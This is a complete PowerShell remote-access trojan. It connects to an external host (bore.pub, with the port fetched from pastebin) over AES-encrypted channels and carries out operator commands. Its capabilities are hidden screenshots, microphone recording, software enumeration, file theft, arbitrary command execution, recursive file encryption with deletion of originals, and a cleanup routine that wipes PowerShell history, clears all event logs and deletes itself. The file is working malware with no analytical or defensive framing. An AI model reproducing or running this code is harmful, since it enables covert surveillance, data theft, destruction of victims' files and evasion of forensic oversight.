class Encryption {
    static [byte[]] $Key
    static [string] $Password = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("czMoZD9nPHVAcVQrPT5uWGR2XktZaDdXVncvYzdVfnJyfjQqSjZ4Xk5fa1NDZXA8c01oU0JURVJRWFUmYTh3OSFabUglLXRSP3U4akRBMiN6ZWJcalA1KTUoRkdQZjlCeWI="))

    static Encryption() {
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes([Encryption]::Password)
        [Encryption]::Key = $sha256.ComputeHash($keyBytes)
    }

    static [string] Encrypt([string]$message) {
        try {
            $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($message)
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = [Encryption]::Key
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.GenerateIV()
            $encryptor = $aes.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($messageBytes, 0, $messageBytes.Length)
            $result = New-Object byte[] ($aes.IV.Length + $encryptedData.Length)
            [Array]::Copy($aes.IV, 0, $result, 0, $aes.IV.Length)
            [Array]::Copy($encryptedData, 0, $result, $aes.IV.Length, $encryptedData.Length)
            return [Convert]::ToBase64String($result)
        }
        catch {
            Write-Error "Encryption failed: $_"
            return ""
        }
    }

    static [string] Decrypt([string]$encryptedMessage) {
        try {
            $encryptedBytes = [Convert]::FromBase64String($encryptedMessage)
            $iv = New-Object byte[] 16
            [Array]::Copy($encryptedBytes, 0, $iv, 0, 16)
            $encryptedData = New-Object byte[] ($encryptedBytes.Length - 16)
            [Array]::Copy($encryptedBytes, 16, $encryptedData, 0, $encryptedData.Length)
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = [Encryption]::Key
            $aes.IV = $iv
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $decryptor = $aes.CreateDecryptor()
            $decryptedBytes = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
            return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        }
        catch {
            Write-Error "Decryption error: $_"
            return ""
        }
    }
}

function GS {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false)]
        [string]$NameFilter = "*"
    )
    try {
        $software64 = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, PSChildName |
            Where-Object { $_.DisplayName -like $NameFilter }
        $software32 = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, PSChildName |
            Where-Object { $_.DisplayName -like $NameFilter }
        $allSoftware = $software64 + $software32 | Sort-Object DisplayName
        if ($allSoftware) {
            return $allSoftware | Format-Table -AutoSize -Property DisplayName, DisplayVersion, Publisher, InstallDate | Out-String
        } else {
            return "No software found matching the filter: $NameFilter"
        }
    }
    catch {
        return "Error enumerating software: $_"
    }
}

class C {
    [string]$H
    [int]$P
    [System.Net.Sockets.TcpClient]$client
    [System.Net.Sockets.NetworkStream]$stream

    C([string]$H, [int]$P) {
        $this.H = $H
        $this.P = $P
    }

    [byte[]] GetKeyFromPassword([string]$password, [byte[]]$salt) {
        try {
            $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
            return $kdf.GetBytes(32)
        }
        catch {
            return $null
        }
    }

    [string] EncryptFile([string]$filePath, [string]$password) {
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
            $salt = New-Object byte[] 16
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
            $keyBytes = $this.GetKeyFromPassword($password, $salt)
            if (-not $keyBytes) {
                return "Failed to generate encryption key"
            }
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $keyBytes
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.GenerateIV()
            $iv = $aes.IV
            $encryptor = $aes.CreateEncryptor()
            $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
            $encryptedContent = [System.Text.Encoding]::UTF8.GetBytes("ENC|") + $salt + $iv + $encryptedBytes
            [System.IO.File]::WriteAllBytes($filePath + ".enc", $encryptedContent)
            Remove-Item -Path $filePath -Force
            return "Encryption successful for file: $filePath"
        }
        catch {
            return "Encryption failed for file: $filePath"
        }
    }

    [string] SR() {
        try {
            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
            wevtutil el | ForEach-Object { wevtutil cl $_ }
            Remove-Item $PSCommandPath -Force 
            return ''
        }
        catch {
            return "Self-remove failed: $_"
        }
    }

    [string] ET([string]$target, [string]$password) {
        if (Test-Path $target -PathType Container) {
            $files = Get-ChildItem -Path $target -Recurse -File
            foreach ($file in $files) {
                $result = $this.EncryptFile($file.FullName, $password)
                if ($result -ne "Encryption successful for file: $($file.FullName)") {
                    return $result
                }
            }
            return "Encryption successful for folder: $target"
        }
        elseif (Test-Path $target -PathType Leaf) {
            return $this.EncryptFile($target, $password)
        }
        else {
            return "Target not found: $target"
        }
    }

    [string] TS() {
        try {
            $timestamp = Get-Date -Format "yyyyMMddHHmmss"
            $tempFile = Join-Path $env:TEMP "sc$timestamp.png"
            $scriptPath = Join-Path $env:TEMP "sc$timestamp.ps1"
            $scriptContent = @'
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            try {
                $form = New-Object Windows.Forms.Form
                $form.TopMost = $true
                $form.ShowInTaskbar = $false
                $form.WindowState = [Windows.Forms.FormWindowState]::Minimized

                $form.Show()
                [System.Windows.Forms.SendKeys]::SendWait("{PRTSC}")
                Start-Sleep -Milliseconds 500

                $bitmap = [System.Windows.Forms.Clipboard]::GetImage()

                if ($bitmap) {
                    $bitmap.Save("TEMP_PATH", [System.Drawing.Imaging.ImageFormat]::Png)
                }

                $form.Close()
            } finally {
                if ($bitmap) { $bitmap.Dispose() }
                if ($form) { $form.Dispose() }
            }
'@
            $scriptContent = $scriptContent.Replace("TEMP_PATH", $tempFile)
            $scriptContent | Out-File -FilePath $scriptPath -Force
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow -Wait
            Start-Sleep -Seconds 1
            if (Test-Path $tempFile) {
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                $base64 = [Convert]::ToBase64String($bytes)
                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                return "SCREENSHOT:$base64"
            }
            else {
                throw "Screenshot file not created"
            }
        }
        catch {
            return "Screenshot failed: $_"
        }
    }

    [string] CA([int]$duration) {
        try {
            $timestamp = Get-Date -Format "yyyyMMddHHmmss"
            $tempFile = Join-Path $env:TEMP "audio_$timestamp.wav"
            $scriptPath = Join-Path $env:TEMP "audio_$timestamp.ps1"
            $scriptContent = @'
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class AudioCapture {
                [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
                public static extern int mciSendString(string lpstrCommand,
                    string lpstrReturnString, int uReturnLength, IntPtr hwndCallback);
            }
"@
            try {
                [AudioCapture]::mciSendString("open new Type waveaudio Alias capture", "", 0, [IntPtr]::Zero)
                [AudioCapture]::mciSendString("set capture bitspersample 16", "", 0, [IntPtr]::Zero)
                [AudioCapture]::mciSendString("set capture channels 2", "", 0, [IntPtr]::Zero)
                [AudioCapture]::mciSendString("set capture samplespersec 44100", "", 0, [IntPtr]::Zero)
                [AudioCapture]::mciSendString("record capture", "", 0, [IntPtr]::Zero)
                Start-Sleep -Seconds DURATION_PLACEHOLDER
                [AudioCapture]::mciSendString("stop capture", "", 0, [IntPtr]::Zero)
                [AudioCapture]::mciSendString("save capture `"TEMP_PATH`"", "", 0, [IntPtr]::Zero)
                [AudioCapture]::mciSendString("close capture", "", 0, [IntPtr]::Zero)
            }
            catch {
                Write-Error $_.Exception.Message
            }
'@
            $scriptContent = $scriptContent.Replace("DURATION_PLACEHOLDER", $duration)
            $scriptContent = $scriptContent.Replace("TEMP_PATH", $tempFile)
            $scriptContent | Out-File -FilePath $scriptPath -Force
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow -Wait
            Start-Sleep -Seconds ($duration + 1)
            if (Test-Path $tempFile) {
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                $base64 = [Convert]::ToBase64String($bytes)
                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                return "AUDIO:$base64"
            }
            else {
                throw "Audio file not created"
            }
        }
        catch {
            return "Audio capture failed: $_"
        }
    }

    [string] EC([string]$command) {
        try {
            if ($command -eq "online") {
                return "yes"
            }
            elseif ($command -eq "whoami") {
                $computerName = $env:COMPUTERNAME
                $userName = $env:USERNAME
                return "$computerName\$userName"
            }
            elseif ($command -eq "getscreen") {
                return $this.TS()
            }
            elseif ($command -match "^getvoice\s+(\d+)$") {
                $duration = [int]$matches[1]
                return $this.CA($duration)
            }
            elseif ($command -eq "getsoft") {
                return GS
            }
            elseif ($command -match "^encrypt\s+(.+?)\s+(.+)$") {
                return $this.ET($matches[1].Trim(), $matches[2].Trim())
            }
            elseif ($command -match "^getfile\s+(.+)$") {
                $filepath = $matches[1].Trim()
                if (Test-Path $filepath) {
                    try {
                        $bytes = [System.IO.File]::ReadAllBytes($filepath)
                        $base64 = [Convert]::ToBase64String($bytes)
                        $filename = Split-Path $filepath -Leaf
                        return "GETFILE:$filename|$base64"
                    }
                    catch {
                        return "Error reading file: $($_.Exception.Message)"
                    }
                }
                else {
                    return "Error: File '$filepath' does not exist."
                }
            }
            elseif ($command -eq "selfremove") {
                return $this.SR()
            }
            else {
                $output = ""
                try {
                    $output = Invoke-Expression $command 2>&1 | Out-String
                    if ($output) {
                        return $output.Trim()
                    }
                }
                catch {
                    try {
                        $output = & cmd.exe /c $command 2>&1 | Out-String
                        if ($output) {
                            return $output.Trim()
                        }
                    }
                    catch {
                        return $_.Exception.Message
                    }
                }
                return "Command Executed"
            }
        }
        catch {
            return $_.Exception.Message
        }
    }

    [void] Connect() {
        $maxRetries = 5
        $retryCount = 0
        while ($retryCount -lt $maxRetries) {
            try {
                $this.client = New-Object System.Net.Sockets.TcpClient
                $this.client.Connect($this.H, $this.P)
                $this.stream = $this.client.GetStream()
                $buffer = New-Object byte[] 4096
                while ($this.client.Connected) {
                    $command = ""
                    do {
                        $read = $this.stream.Read($buffer, 0, $buffer.Length)
                        if ($read -le 0) { throw "Disconnected" }
                        $command += [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
                    } while ($this.stream.DataAvailable)
                    $command = [Encryption]::Decrypt($command.Trim())
                    if ($command -eq "") { continue }
                    if ($command -eq "exit") { break }
                    $encrypted_output = [Encryption]::Encrypt($this.EC($command))
                    $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($encrypted_output + "`n")
                    $this.stream.Write($outputBytes, 0, $outputBytes.Length)
                }
                $this.client.Close()
                break
            }
            catch {
                $retryCount++
                Start-Sleep -Seconds 3
            }
        }
    }
}

$cc = [C]::new("bore.pub", [int](Invoke-WebRequest -Uri "https://pastebin.com/raw/zgqJmhh7" | Select-Object -ExpandProperty Content))
$cc.Connect()